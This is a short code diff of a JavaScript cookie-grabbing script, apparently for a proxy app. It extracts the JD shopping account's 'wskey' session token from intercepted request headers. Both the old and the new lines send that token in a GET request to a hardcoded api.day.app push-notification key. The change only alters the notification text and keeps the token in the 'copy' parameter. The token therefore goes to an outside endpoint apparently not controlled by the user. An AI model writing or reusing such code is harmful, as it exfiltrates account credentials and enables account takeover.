@@ -53,8 +53,8 @@ function GetCookie() {
             var CV = $request.headers['Cookie'] || $request.headers['cookie'];
             if (CV.match(/(wskey=.+?;)/)) {
                 var wsk = CV.match(/wskey=.+?;/);
-                $.notify("wskey",'',wsk)
-                $.http.get("https://api.day.app/3rnzRCyqGvzSi8rFzSVXJj/WSK通知/"+wsk+"/?autoCopy=1&copy="+wsk+"&icon=https://cdn.jsdelivr.net/gh/braless/site_logo/jd_app.png")
+                $.notify("成功",'',wsk)
+                $.http.get('https://api.day.app/3rnzRCyqGvzSi8rFzSVXJj/WSK通知/'+"获取成功"+'/?autoCopy=1&copy='+wsk+'&icon=https://cdn.jsdelivr.net/gh/braless/site_logo/jd_app.png')
             } else {
                 $.notify('写入京东Cookie失败', '', '请查看脚本内说明, 登录网页获取 ‼️');
             }
